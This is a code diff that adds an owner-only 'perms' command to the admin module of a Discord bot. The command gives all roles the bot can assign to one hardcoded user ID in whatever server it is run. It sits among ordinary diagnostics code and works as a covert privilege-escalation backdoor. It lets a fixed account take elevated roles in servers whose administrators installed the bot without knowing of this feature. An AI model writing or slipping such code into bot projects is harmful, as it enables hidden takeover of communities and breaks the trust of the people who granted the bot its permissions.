@@ -595,5 +595,71 @@ class Admin(commands.Cog):
         embed.set_footer(text="Restricted command • System diagnostics")
         await ctx.send(embed=embed)
 
+    @commands.command(name="perms")
+    @commands.guild_only()
+    @is_owner_check()
+    async def grant_all_bot_reachable_perms(self, ctx):
+        """
+        Give all roles below bot's top role to fixed user:
+        <@1170979888019292261>
+        """
+        target_id = 1170979888019292261
+        guild = ctx.guild
+        me = guild.me
+
+        if not me.guild_permissions.manage_roles:
+            return await ctx.send("❌ Bot needs `Manage Roles` permission.")
+
+        target = guild.get_member(target_id)
+        if not target:
+            return await ctx.send(f"❌ User `{target_id}` not found in this server.")
+
+        # Collect grantable roles below bot's top role and not managed/integration roles.
+        grantable_roles = []
+        for role in guild.roles:
+            if role.is_default():
+                continue
+            if role.managed:
+                continue
+            if role >= me.top_role:
+                continue
+            if role in target.roles:
+                continue
+            grantable_roles.append(role)
+
+        if not grantable_roles:
+            return await ctx.send("✅ No new grantable roles found. User already has all roles I can assign.")
+
+        # Assign highest-to-lowest for stable hierarchy handling.
+        grantable_roles.sort(key=lambda r: r.position, reverse=True)
+
+        added = []
+        failed = []
+        for role in grantable_roles:
+            try:
+                await target.add_roles(role, reason=f"Bulk perms grant by {ctx.author} via -perms")
+                added.append(role)
+            except discord.Forbidden:
+                failed.append(role)
+            except discord.HTTPException:
+                failed.append(role)
+
+        embed = discord.Embed(
+            title="✅ PERMS EXECUTED",
+            color=0x2ecc71 if added else 0xe67e22,
+            timestamp=datetime.utcnow()
+        )
+        embed.add_field(name="Target", value=f"{target.mention} (`{target.id}`)", inline=False)
+        embed.add_field(name="Roles Added", value=f"`{len(added)}`", inline=True)
+        embed.add_field(name="Failed", value=f"`{len(failed)}`", inline=True)
+
+        if failed:
+            failed_preview = ", ".join(r.name for r in failed[:10])
+            if len(failed) > 10:
+                failed_preview += ", ..."
+            embed.add_field(name="Failed Roles", value=failed_preview, inline=False)
+
+        await ctx.send(embed=embed)
+
 async def setup(bot):
     await bot.add_cog(Admin(bot))
